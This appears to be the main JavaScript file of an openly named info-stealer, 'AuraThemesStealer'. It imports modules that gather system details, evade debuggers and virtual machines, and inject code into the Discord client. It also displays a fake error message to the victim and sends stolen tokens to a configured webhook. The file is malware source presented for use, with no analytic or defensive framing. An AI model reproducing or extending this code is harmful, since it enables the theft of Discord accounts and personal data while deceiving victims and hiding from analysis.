
require("dotenv").config();
require("./utils/console/error.js").error();

const { get_info } = require("./modules/core/core.js");
const { discord_injected } = require("./modules/injections/discord.js");
const { fake_error } = require("./modules/fake_error/fake.js");
const { send_webhook_tokens } = require("./modules/tokens/send.js");
const { antidebug } = require("./modules/antidebug/antidebug.js");

const config = require("./config/config.js");

const {
    WEBHOOK,
    ERROR_MESSAGE,
    VM_DEBUGGER,
    DC_INJECTION
} = config;

class AuraThemesStealer {
    constructor() {
        this.aurita();
    }
    async aurita() {
        try {
            const {
                DISK,
                RAM,
                UID,
                CPU_COUNT,
                IP,
                OS,
                CPU,
                GPU,
                WINDOWS_KEY,
                WINDOWS_VERSION
            } = await get_info();
    
            antidebug(VM_DEBUGGER, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
    
            fake_error(ERROR_MESSAGE);
            discord_injected(DC_INJECTION, WEBHOOK);
    
            send_webhook_tokens(WEBHOOK);
    
        } catch (err) {
            console.log(err)
        }
    }
}

new AuraThemesStealer();
